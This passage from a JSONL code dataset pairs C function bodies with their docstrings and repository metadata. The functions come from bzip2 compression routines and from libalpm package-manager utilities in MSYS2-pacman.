  return BZ_OK;\n\n   output_overflow:\n   BZ2_bzCompressEnd ( &strm );\n   return BZ_OUTBUFF_FULL;\n\n   errhandler:\n   BZ2_bzCompressEnd ( &strm );\n   return ret;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzWriteClose)\n                  ( int*          bzerror, \n                    BZFILE*       b, \n                    int           abandon,\n                    unsigned int* nbytes_in,\n                    unsigned int* nbytes_out )", "code": "{\n   BZ2_bzWriteClose64 ( bzerror, b, abandon, \n                        nbytes_in, NULL, nbytes_out, NULL );\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n/* Return  True iff data corruption is discovered.\n   Returns False if there is no problem.\n*/\n", "func_signal": "static\nBool unRLE_obuf_to_output_FAST ( DState* s )", "code": "{\n   UChar k1;\n\n   if (s->blockRandomised) {\n\n      while (True) {\n         /* try to finish existing run */\n         while (True) {\n            if (s->strm->avail_out == 0) return False;\n            if (s->state_out_len == 0) break;\n            *( (UChar*)(s->strm->next_out) ) = s->state_out_ch;\n            BZ_UPDATE_CRC ( s->calculatedBlockCRC, s->state_out_ch );\n            s->state_out_len--;\n            s->strm->next_out++;\n            s->strm->avail_out--;\n            s->strm->total_out_lo32++;\n            if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n         }\n\n         /* can a new run be started? */\n         if (s->nblock_used == s->save_nblock+1) return False;\n               \n         /* Only caused by corrupt data stream? */\n         if (s->nblock_used > s->save_nblock+1)\n            return True;\n   \n         s->state_out_len = 1;\n         s->state_out_ch = s->k0;\n         BZ_GET_FAST(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 2;\n         BZ_GET_FAST(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 3;\n         BZ_GET_FAST(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         BZ_GET_FAST(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         s->state_out_len = ((Int32)k1) + 4;\n         BZ_GET_FAST(s->k0); BZ_RAND_UPD_MASK; \n         s->k0 ^= BZ_RAND_MASK; s->nblock_used++;\n      }\n\n   } else {\n\n      /* restore */\n      UInt32        c_calculatedBlockCRC = s->calculatedBlockCRC;\n      UChar         c_state_out_ch       = s->state_out_ch;\n      Int32         c_state_out_len      = s->state_out_len;\n      Int32         c_nblock_used        = s->nblock_used;\n      Int32         c_k0                 = s->k0;\n      UInt32*       c_tt                 = s->tt;\n      UInt32        c_tPos               = s->tPos;\n      char*         cs_next_out          = s->strm->next_out;\n      unsigned int  cs_avail_out         = s->strm->avail_out;\n      Int32         ro_blockSize100k     = s->blockSize100k;\n      /* end restore */\n\n      UInt32       avail_out_INIT = cs_avail_out;\n      Int32        s_save_nblockPP = s->save_nblock+1;\n      unsigned int total_out_lo32_old;\n\n      while (True) {\n\n         /* try to finish existing run */\n         if (c_state_out_len > 0) {\n            while (True) {\n               if (cs_avail_out == 0) goto return_notr;\n               if (c_state_out_len == 1) break;\n               *( (UChar*)(cs_next_out) ) = c_state_out_ch;\n               BZ_UPDATE_CRC ( c_calculatedBlockCRC, c_state_out_ch );\n               c_state_out_len--;\n               cs_next_out++;\n               cs_avail_out--;\n            }\n            s_state_out_len_eq_one:\n            {\n               if (cs_avail_out == 0) { \n                  c_state_out_len = 1; goto return_notr;\n               };\n               *( (UChar*)(cs_next_out) ) = c_state_out_ch;\n               BZ_UPDATE_CRC ( c_calculatedBlockCRC, c_state_out_ch );\n               cs_next_out++;\n               cs_avail_out--;\n            }\n         }   \n         /* Only caused by corrupt data stream? */\n         if (c_nblock_used > s_save_nblockPP)\n            return True;\n\n         /* can a new run be started? */\n         if (c_nblock_used == s_save_nblockPP) {\n            c_state_out_len = 0; goto return_notr;\n         };   \n         c_state_out_ch = c_k0;\n         BZ_GET_FAST_C(k1); c_nblock_used++;\n         if (k1 != c_k0) { \n            c_k0 = k1; goto s_state_out_len_eq_one; \n         };\n         if (c_nblock_used == s_save_nblockPP) \n            goto s_state_out_len_eq_one;\n   \n         c_state_out_len = 2;\n         BZ_GET_FAST_C(k1); c_nblock_used++;\n         if (c_nblock_used == s_save_nblockPP) continue;\n         if (k1 != c_k0) { c_k0 = k1; continue; };\n   \n         c_state_out_len = 3;\n         BZ_GET_FAST_C(k1); c_nblock_used++;\n         if (c_nblock_used == s_save_nblockPP) continue;\n         if (k1 != c_k0) { c_k0 = k1; continue; };\n   \n         BZ_GET_FAST_C(k1); c_nblock_used++;\n         c_state_out_len = ((Int32)k1) + 4;\n         BZ_GET_FAST_C(c_k0); c_nblock_used++;\n      }\n\n      return_notr:\n      total_out_lo32_old = s->strm->total_out_lo32;\n      s->strm->total_out_lo32 += (avail_out_INIT - cs_avail_out);\n      if (s->strm->total_out_lo32 < total_out_lo32_old)\n         s->strm->total_out_hi32++;\n\n      /* save */\n      s->calculatedBlockCRC = c_calculatedBlockCRC;\n      s->state_out_ch       = c_state_out_ch;\n      s->state_out_len      = c_state_out_len;\n      s->nblock_used        = c_nblock_used;\n      s->k0                 = c_k0;\n      s->tt                 = c_tt;\n      s->tPos               = c_tPos;\n      s->strm->next_out     = cs_next_out;\n      s->strm->avail_out    = cs_avail_out;\n      /* end save */\n   }\n   return False;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid init_RL ( EState* s )", "code": "{\n   s->state_in_ch  = 256;\n   s->state_in_len = 0;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompressInit) \n                     ( bz_stream* strm, \n                       int        verbosity,\n                       int        small )", "code": "{\n   DState* s;\n\n   if (!bz_config_ok()) return BZ_CONFIG_ERROR;\n\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   if (small != 0 && small != 1) return BZ_PARAM_ERROR;\n   if (verbosity < 0 || verbosity > 4) return BZ_PARAM_ERROR;\n\n   if (strm->bzalloc == NULL) strm->bzalloc = default_bzalloc;\n   if (strm->bzfree == NULL) strm->bzfree = default_bzfree;\n\n   s = BZALLOC( sizeof(DState) );\n   if (s == NULL) return BZ_MEM_ERROR;\n   s->strm                  = strm;\n   strm->state              = s;\n   s->state                 = BZ_X_MAGIC_1;\n   s->bsLive                = 0;\n   s->bsBuff                = 0;\n   s->calculatedCombinedCRC = 0;\n   strm->total_in_lo32      = 0;\n   strm->total_in_hi32      = 0;\n   strm->total_out_lo32     = 0;\n   strm->total_out_hi32     = 0;\n   s->smallDecompress       = (Bool)small;\n   s->ll4                   = NULL;\n   s->ll16                  = NULL;\n   s->tt                    = NULL;\n   s->currBlockNo           = 0;\n   s->verbosity             = verbosity;\n\n   return BZ_OK;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "__inline__ Int32 BZ2_indexIntoF ( Int32 indx, Int32 *cftab )", "code": "{\n   Int32 nb, na, mid;\n   nb = 0;\n   na = 256;\n   do {\n      mid = (nb + na) >> 1;\n      if (indx >= cftab[mid]) nb = mid; else na = mid;\n   }\n   while (na - nb != 1);\n   return nb;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid prepare_new_block ( EState* s )", "code": "{\n   Int32 i;\n   s->nblock = 0;\n   s->numZ = 0;\n   s->state_out_pos = 0;\n   BZ_INITIALISE_CRC ( s->blockCRC );\n   for (i = 0; i < 256; i++) s->inUse[i] = False;\n   s->blockNo++;\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid add_pair_to_block ( EState* s )", "code": "{\n   Int32 i;\n   UChar ch = (UChar)(s->state_in_ch);\n   for (i = 0; i < s->state_in_len; i++) {\n      BZ_UPDATE_CRC( s->blockCRC, ch );\n   }\n   s->inUse[s->state_in_ch] = True;\n   switch (s->state_in_len) {\n      case 1:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      case 2:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      case 3:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      default:\n         s->inUse[s->state_in_len-4] = True;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = ((UChar)(s->state_in_len-4));\n         s->nblock++;\n         break;\n   }\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzclose) (BZFILE* b)", "code": "{\n   int bzerr;\n   FILE *fp;\n   \n   if (b==NULL) {return;}\n   fp = ((bzFile *)b)->handle;\n   if(((bzFile*)b)->writing){\n      BZ2_bzWriteClose(&bzerr,b,0,NULL,NULL);\n      if(bzerr != BZ_OK){\n         BZ2_bzWriteClose(NULL,b,1,NULL,NULL);\n      }\n   }else{\n      BZ2_bzReadClose(&bzerr,b);\n   }\n   if(fp!=stdin && fp!=stdout){\n      fclose(fp);\n   }\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------*/\n/* Pre:\n      nblock > 0\n      arr2 exists for [0 .. nblock-1 +N_OVERSHOOT]\n      ((UChar*)arr2)  [0 .. nblock-1] holds block\n      arr1 exists for [0 .. nblock-1]\n\n   Post:\n      ((UChar*)arr2) [0 .. nblock-1] holds block\n      All other areas of block destroyed\n      ftab [ 0 .. 65536 ] destroyed\n      arr1 [0 .. nblock-1] holds sorted order\n*/\n", "func_signal": "void BZ2_blockSort ( EState* s )", "code": "{\n   UInt32* ptr    = s->ptr; \n   UChar*  block  = s->block;\n   UInt32* ftab   = s->ftab;\n   Int32   nblock = s->nblock;\n   Int32   verb   = s->verbosity;\n   Int32   wfact  = s->workFactor;\n   UInt16* quadrant;\n   Int32   budget;\n   Int32   budgetInit;\n   Int32   i;\n\n   if (nblock < 10000) {\n      fallbackSort ( s->arr1, s->arr2, ftab, nblock, verb );\n   } else {\n      /* Calculate the location for quadrant, remembering to get\n         the alignment right.  Assumes that &(block[0]) is at least\n         2-byte aligned -- this should be ok since block is really\n         the first section of arr2.\n      */\n      i = nblock+BZ_N_OVERSHOOT;\n      if (i & 1) i++;\n      quadrant = (UInt16*)(&(block[i]));\n\n      /* (wfact-1) / 3 puts the default-factor-30\n         transition point at very roughly the same place as \n         with v0.1 and v0.9.0.  \n         Not that it particularly matters any more, since the\n         resulting compressed stream is now the same regardless\n         of whether or not we use the main sort or fallback sort.\n      */\n      if (wfact < 1  ) wfact = 1;\n      if (wfact > 100) wfact = 100;\n      budgetInit = nblock * ((wfact-1) / 3);\n      budget = budgetInit;\n\n      mainSort ( ptr, block, quadrant, ftab, nblock, verb, &budget );\n      if (verb >= 3) \n         VPrintf3 ( \"      %d work, %d block, ratio %5.2f\\n\",\n                    budgetInit - budget,\n                    nblock, \n                    (float)(budgetInit - budget) /\n                    (float)(nblock==0 ? 1 : nblock) ); \n      if (budget < 0) {\n         if (verb >= 2) \n            VPrintf0 ( \"    too repetitive; using fallback\"\n                       \" sorting algorithm\\n\" );\n         fallbackSort ( s->arr1, s->arr2, ftab, nblock, verb );\n      }\n   }\n\n   s->origPtr = -1;\n   for (i = 0; i < s->nblock; i++)\n      if (ptr[i] == 0)\n         { s->origPtr = i; break; };\n\n   AssertH( s->origPtr != -1, 1003 );\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\blocksort.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzCompress) ( bz_stream *strm, int action )", "code": "{\n   Bool progress;\n   EState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   preswitch:\n   switch (s->mode) {\n\n      case BZ_M_IDLE:\n         return BZ_SEQUENCE_ERROR;\n\n      case BZ_M_RUNNING:\n         if (action == BZ_RUN) {\n            progress = handle_compress ( strm );\n            return progress ? BZ_RUN_OK : BZ_PARAM_ERROR;\n         } \n         else\n\t if (action == BZ_FLUSH) {\n            s->avail_in_expect = strm->avail_in;\n            s->mode = BZ_M_FLUSHING;\n            goto preswitch;\n         }\n         else\n         if (action == BZ_FINISH) {\n            s->avail_in_expect = strm->avail_in;\n            s->mode = BZ_M_FINISHING;\n            goto preswitch;\n         }\n         else \n            return BZ_PARAM_ERROR;\n\n      case BZ_M_FLUSHING:\n         if (action != BZ_FLUSH) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect != s->strm->avail_in) \n            return BZ_SEQUENCE_ERROR;\n         progress = handle_compress ( strm );\n         if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n             s->state_out_pos < s->numZ) return BZ_FLUSH_OK;\n         s->mode = BZ_M_RUNNING;\n         return BZ_RUN_OK;\n\n      case BZ_M_FINISHING:\n         if (action != BZ_FINISH) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect != s->strm->avail_in) \n            return BZ_SEQUENCE_ERROR;\n         progress = handle_compress ( strm );\n         if (!progress) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n             s->state_out_pos < s->numZ) return BZ_FINISH_OK;\n         s->mode = BZ_M_IDLE;\n         return BZ_STREAM_END;\n   }\n   return BZ_OK; /*--not reached--*/\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzReadClose) ( int *bzerror, BZFILE *b )", "code": "{\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n   if (bzf == NULL)\n      { BZ_SETERR(BZ_OK); return; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n\n   if (bzf->initialisedOk)\n      (void)BZ2_bzDecompressEnd ( &(bzf->strm) );\n   free ( bzf );\n}", "path": "incremetalupdate\\src\\main\\cpp\\bzip2\\bzlib.c", "repo_name": "yale8848/EasyIncrementalUpdate", "stars": 238, "license": "mit", "language": "c", "size": 393}
{"docstring": "/**\n * Open a package mtree file for reading.\n * @param pkg the local package to read the changelog of\n * @return a archive structure for the package mtree file\n */\n", "func_signal": "static struct archive *_cache_mtree_open(alpm_pkg_t *pkg)", "code": "{\n\tint r;\n\tstruct archive *mtree;\n\n\talpm_db_t *db = alpm_pkg_get_db(pkg);\n\tchar *mtfile = _alpm_local_db_pkgpath(db, pkg, \"mtree\");\n\n\tif(access(mtfile, F_OK) != 0) {\n\t\t/* there is no mtree file for this package */\n\t\tgoto error;\n\t}\n\n\tif((mtree = archive_read_new()) == NULL) {\n\t\tpkg->handle->pm_errno = ALPM_ERR_LIBARCHIVE;\n\t\tgoto error;\n\t}\n\n\t_alpm_archive_read_support_filter_all(mtree);\n\tarchive_read_support_format_mtree(mtree);\n\n\tif((r = _alpm_archive_read_open_file(mtree, mtfile, ALPM_BUFFER_SIZE))) {\n\t\t_alpm_log(pkg->handle, ALPM_LOG_ERROR, _(\"error while reading file %s: %s\\n\"),\n\t\t\t\t\tmtfile, archive_error_string(mtree));\n\t\tpkg->handle->pm_errno = ALPM_ERR_LIBARCHIVE;\n\t\t_alpm_archive_read_free(mtree);\n\t\tgoto error;\n\t}\n\n\tfree(mtfile);\n\treturn mtree;\n\nerror:\n\tfree(mtfile);\n\treturn NULL;\n}", "path": "lib\\libalpm\\be_local.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Convert a string to a file offset.\n * This parses bare positive integers only.\n * @param line string to convert\n * @return off_t on success, -1 on error\n */\n", "func_signal": "off_t _alpm_strtoofft(const char *line)", "code": "{\n\tchar *end;\n\tunsigned long long result;\n\terrno = 0;\n\n\t/* we are trying to parse bare numbers only, no leading anything */\n\tif(!isdigit((unsigned char)line[0])) {\n\t\treturn (off_t)-1;\n\t}\n\tresult = strtoull(line, &end, 10);\n\tif(result == 0 && end == line) {\n\t\t/* line was not a number */\n\t\treturn (off_t)-1;\n\t} else if(result == ULLONG_MAX && errno == ERANGE) {\n\t\t/* line does not fit in unsigned long long */\n\t\treturn (off_t)-1;\n\t} else if(*end) {\n\t\t/* line began with a number but has junk left over at the end */\n\t\treturn (off_t)-1;\n\t}\n\n\treturn (off_t)result;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Think of this as realloc with error handling. If realloc fails NULL will be\n * returned and data will not be changed.\n *\n * Newly created memory will be zeroed.\n *\n * @param data source memory space\n * @param current size of the space pointed to by data\n * @param required size you want\n * @return new memory; NULL on error\n */\n", "func_signal": "void *_alpm_realloc(void **data, size_t *current, const size_t required)", "code": "{\n\tchar *newdata;\n\n\tnewdata = realloc(*data, required);\n\tif(!newdata) {\n\t\t_alpm_alloc_fail(required);\n\t\treturn NULL;\n\t}\n\n\tif (*current < required) {\n\t\t/* ensure all new memory is zeroed out, in both the initial\n\t\t * allocation and later reallocs */\n\t\tmemset(newdata + *current, 0, required - *current);\n\t}\n\t*current = required;\n\t*data = newdata;\n\treturn newdata;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Find a filename in a registered alpm cachedir.\n * @param handle the context handle\n * @param filename name of file to find\n * @return malloced path of file, NULL if not found\n */\n", "func_signal": "char *_alpm_filecache_find(alpm_handle_t *handle, const char *filename)", "code": "{\n\tchar path[PATH_MAX];\n\tchar *retpath;\n\talpm_list_t *i;\n\tstruct stat buf;\n\n\t/* Loop through the cache dirs until we find a matching file */\n\tfor(i = handle->cachedirs; i; i = i->next) {\n\t\tsnprintf(path, PATH_MAX, \"%s%s\", (char *)i->data,\n\t\t\t\tfilename);\n\t\tif(stat(path, &buf) == 0 && S_ISREG(buf.st_mode)) {\n\t\t\tretpath = strdup(path);\n\t\t\t_alpm_log(handle, ALPM_LOG_DEBUG, \"found cached pkg: %s\\n\", retpath);\n\t\t\treturn retpath;\n\t\t}\n\t}\n\t/* package wasn't found in any cachedir */\n\treturn NULL;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Unpack a specific file in an archive.\n * @param handle the context handle\n * @param archive the archive to unpack\n * @param prefix where to extract the files\n * @param filename a file within the archive to unpack\n * @return 0 on success, 1 on failure\n */\n", "func_signal": "int _alpm_unpack_single(alpm_handle_t *handle, const char *archive,\n\t\tconst char *prefix, const char *filename)", "code": "{\n\talpm_list_t *list = NULL;\n\tint ret = 0;\n\tif(filename == NULL) {\n\t\treturn 1;\n\t}\n\tlist = alpm_list_add(list, (void *)filename);\n\tret = _alpm_unpack(handle, archive, prefix, list, 1);\n\talpm_list_free(list);\n\treturn ret;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** This automatically grows data based on current/required.\n *\n * The memory space will be initialised to required bytes and doubled in size when required.\n *\n * Newly created memory will be zeroed.\n * @param data source memory space\n * @param current size of the space pointed to by data\n * @param required size you want\n * @return new memory if grown; old memory otherwise; NULL on error\n */\n", "func_signal": "void *_alpm_greedy_grow(void **data, size_t *current, const size_t required)", "code": "{\n\tsize_t newsize = 0;\n\n\tif(*current >= required) {\n\t\treturn data;\n\t}\n\n\tif(*current == 0) {\n\t\tnewsize = required;\n\t} else {\n\t\tnewsize = *current * 2;\n\t}\n\n\t/* check for overflows */\n\tif (newsize < required) {\n\t\treturn NULL;\n\t}\n\n\treturn _alpm_realloc(data, current, newsize);\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Hash the given string to an unsigned long value.\n * This is the standard sdbm hashing algorithm.\n * @param str string to hash\n * @return the hash value of the given string\n */\n", "func_signal": "unsigned long _alpm_hash_sdbm(const char *str)", "code": "{\n\tunsigned long hash = 0;\n\tint c;\n\n\tif(!str) {\n\t\treturn hash;\n\t}\n\twhile((c = *str++)) {\n\t\thash = c + hash * 65599;\n\t}\n\n\treturn hash;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Parse a full package specifier.\n * @param target package specifier to parse, such as: \"pacman-4.0.1-2\",\n * \"pacman-4.01-2/\", or \"pacman-4.0.1-2/desc\"\n * @param name to hold package name\n * @param version to hold package version\n * @param name_hash to hold package name hash\n * @return 0 on success, -1 on error\n */\n", "func_signal": "int _alpm_splitname(const char *target, char **name, char **version,\n\t\tunsigned long *name_hash)", "code": "{\n\t/* the format of a db entry is as follows:\n\t *    package-version-rel/\n\t *    package-version-rel/desc (we ignore the filename portion)\n\t * package name can contain hyphens, so parse from the back- go back\n\t * two hyphens and we have split the version from the name.\n\t */\n\tconst char *pkgver, *end;\n\n\tif(target == NULL) {\n\t\treturn -1;\n\t}\n\n\t/* remove anything trailing a '/' */\n\tend = strchr(target, '/');\n\tif(!end) {\n\t\tend = target + strlen(target);\n\t}\n\n\t/* do the magic parsing- find the beginning of the version string\n\t * by doing two iterations of same loop to lop off two hyphens */\n\tfor(pkgver = end - 1; *pkgver && *pkgver != '-'; pkgver--);\n\tfor(pkgver = pkgver - 1; *pkgver && *pkgver != '-'; pkgver--);\n\tif(*pkgver != '-' || pkgver == target) {\n\t\treturn -1;\n\t}\n\n\t/* copy into fields and return */\n\tif(version) {\n\t\tif(*version) {\n\t\t\tFREE(*version);\n\t\t}\n\t\t/* version actually points to the dash, so need to increment 1 and account\n\t\t * for potential end character */\n\t\tSTRNDUP(*version, pkgver + 1, end - pkgver - 1, return -1);\n\t}\n\n\tif(name) {\n\t\tif(*name) {\n\t\t\tFREE(*name);\n\t\t}\n\t\tSTRNDUP(*name, target, pkgver - target, return -1);\n\t\tif(name_hash) {\n\t\t\t*name_hash = _alpm_hash_sdbm(*name);\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/** Calculates a file's MD5 or SHA-2 digest and compares it to an expected value.\n * @param filepath path of the file to check\n * @param expected hash value to compare against\n * @param type digest type to use\n * @return 0 if file matches the expected hash, 1 if they do not match, -1 on\n * error\n */\n", "func_signal": "int _alpm_test_checksum(const char *filepath, const char *expected,\n\t\talpm_pkgvalidation_t type)", "code": "{\n\tchar *computed;\n\tint ret;\n\n\tif(type == ALPM_PKG_VALIDATION_MD5SUM) {\n\t\tcomputed = alpm_compute_md5sum(filepath);\n\t} else if(type == ALPM_PKG_VALIDATION_SHA256SUM) {\n\t\tcomputed = alpm_compute_sha256sum(filepath);\n\t} else {\n\t\treturn -1;\n\t}\n\n\tif(expected == NULL || computed == NULL) {\n\t\tret = -1;\n\t} else if(strcmp(expected, computed) != 0) {\n\t\tret = 1;\n\t} else {\n\t\tret = 0;\n\t}\n\n\tFREE(computed);\n\treturn ret;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/* note the while(1) and not (0) */\n", "func_signal": "static int local_db_read(alpm_pkg_t *info, alpm_dbinfrq_t inforeq)", "code": "{\n\tFILE *fp = NULL;\n\tchar line[1024];\n\talpm_db_t *db = info->origin_data.db;\n\n\t/* bitmask logic here:\n\t * infolevel: 00001111\n\t * inforeq:   00010100\n\t * & result:  00000100\n\t * == to inforeq? nope, we need to load more info. */\n\tif((info->infolevel & inforeq) == inforeq) {\n\t\t/* already loaded all of this info, do nothing */\n\t\treturn 0;\n\t}\n\n\tif(info->infolevel & INFRQ_ERROR) {\n\t\t/* We've encountered an error loading this package before. Don't attempt\n\t\t * repeated reloads, just give up. */\n\t\treturn -1;\n\t}\n\n\t_alpm_log(db->handle, ALPM_LOG_FUNCTION,\n\t\t\t\"loading package data for %s : level=0x%x\\n\",\n\t\t\tinfo->name, inforeq);\n\n\t/* clear out 'line', to be certain - and to make valgrind happy */\n\tmemset(line, 0, sizeof(line));\n\n\t/* DESC */\n\tif(inforeq & INFRQ_DESC && !(info->infolevel & INFRQ_DESC)) {\n\t\tchar *path = _alpm_local_db_pkgpath(db, info, \"desc\");\n\t\tif(!path || (fp = fopen(path, \"r\")) == NULL) {\n\t\t\t_alpm_log(db->handle, ALPM_LOG_ERROR, _(\"could not open file %s: %s\\n\"), path, strerror(errno));\n\t\t\tfree(path);\n\t\t\tgoto error;\n\t\t}\n\t\tfree(path);\n\t\twhile(!feof(fp)) {\n\t\t\tif(safe_fgets(line, sizeof(line), fp) == NULL && !feof(fp)) {\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t\tif(_alpm_strip_newline(line, 0) == 0) {\n\t\t\t\t/* length of stripped line was zero */\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif(strcmp(line, \"%NAME%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tif(strcmp(line, info->name) != 0) {\n\t\t\t\t\t_alpm_log(db->handle, ALPM_LOG_ERROR, _(\"%s database is inconsistent: name \"\n\t\t\t\t\t\t\t\t\"mismatch on package %s\\n\"), db->treename, info->name);\n\t\t\t\t}\n\t\t\t} else if(strcmp(line, \"%VERSION%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tif(strcmp(line, info->version) != 0) {\n\t\t\t\t\t_alpm_log(db->handle, ALPM_LOG_ERROR, _(\"%s database is inconsistent: version \"\n\t\t\t\t\t\t\t\t\"mismatch on package %s\\n\"), db->treename, info->name);\n\t\t\t\t}\n\t\t\t} else if(strcmp(line, \"%BASE%\") == 0) {\n\t\t\t\tREAD_AND_STORE(info->base);\n\t\t\t} else if(strcmp(line, \"%DESC%\") == 0) {\n\t\t\t\tREAD_AND_STORE(info->desc);\n\t\t\t} else if(strcmp(line, \"%GROUPS%\") == 0) {\n\t\t\t\tREAD_AND_STORE_ALL(info->groups);\n\t\t\t} else if(strcmp(line, \"%URL%\") == 0) {\n\t\t\t\tREAD_AND_STORE(info->url);\n\t\t\t} else if(strcmp(line, \"%LICENSE%\") == 0) {\n\t\t\t\tREAD_AND_STORE_ALL(info->licenses);\n\t\t\t} else if(strcmp(line, \"%ARCH%\") == 0) {\n\t\t\t\tREAD_AND_STORE(info->arch);\n\t\t\t} else if(strcmp(line, \"%BUILDDATE%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tinfo->builddate = _alpm_parsedate(line);\n\t\t\t} else if(strcmp(line, \"%INSTALLDATE%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tinfo->installdate = _alpm_parsedate(line);\n\t\t\t} else if(strcmp(line, \"%PACKAGER%\") == 0) {\n\t\t\t\tREAD_AND_STORE(info->packager);\n\t\t\t} else if(strcmp(line, \"%REASON%\") == 0) {\n\t\t\t\tREAD_NEXT();\n\t\t\t\tinfo->reason = 